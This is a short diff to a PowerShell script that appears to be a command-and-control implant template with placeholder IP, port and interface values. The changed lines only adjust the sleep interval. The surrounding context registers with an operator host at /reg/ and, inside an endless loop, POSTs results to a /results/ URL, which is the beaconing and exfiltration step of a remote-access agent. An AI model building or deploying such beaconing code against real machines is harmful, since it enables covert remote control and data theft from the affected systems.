@@ -78,7 +78,8 @@ $ip   = "REPLACE_IP"
 $port = "REPLACE_PORT"
 $interface = "REPLACE_INTERFACE"
 # $key  = "REPLACE_KEY"
-$n    = 3
+$n = 3
+# $n    = replace_j
 
 $regl  = ("http" + ':' + "//$ip" + ':' + "$port/reg/")
 $data  = @{
@@ -108,7 +109,8 @@ for (;;){
         Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
         #http://192.168.71.142:8000/results/GTLBHU/
 
-        sleep $n
     }
+    Start-Sleep -Seconds $n
+
 }
 
